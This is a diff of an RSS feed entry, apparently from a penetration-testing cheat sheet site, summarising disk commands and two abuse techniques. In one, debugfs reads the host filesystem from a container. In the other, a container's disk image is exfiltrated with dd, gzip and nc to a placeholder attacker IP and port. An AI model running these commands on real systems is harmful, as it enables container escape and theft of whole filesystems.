@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/disk/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/disk/</guid>
-      <description>Basic # Show devices lsblk # Device attributes blkid # Show swap on blk swapon -s # Filesystem info cat /etc/fstab Abuse #1: Read host&amp;rsquo;s filesystem from container (root) # Open target device debugfs /dev/sda1 # Exploit ls /root Abuse #2: Read container&amp;rsquo;s filesystem from host # Show LVM mappings ls -l /dev/mapper/ # In our local machine nc -lvnp 4444 &amp;gt; dm-0.gz # Exfil filesystem (target container rootfs, e.</description>
+      <description>Basic # Show devices lsblk # Device attributes blkid # Show swap on blk swapon -s # Filesystem info cat /etc/fstab Abuse #1: Read host&amp;rsquo;s filesystem from container (root) # Open target device debugfs /dev/sda1 # Exploit ls /root Abuse #2: Read container&amp;rsquo;s filesystem from host # Show LVM mappings ls -l /dev/mapper/ # In our local machine nc -lvnp &amp;lt;LOCAL_PORT&amp;gt; &amp;gt; dm-0.gz # Exfil filesystem (target container rootfs, e.g. dm-0) dd if=/dev/dm-0 | gzip -1 - | nc &amp;lt;LOCAL_IP&amp;gt; &amp;lt;LOCAL_PORT&amp;gt; # Extract dm-0 gunzip dm-0.</description>
     </item>
   </channel>
 </rss>
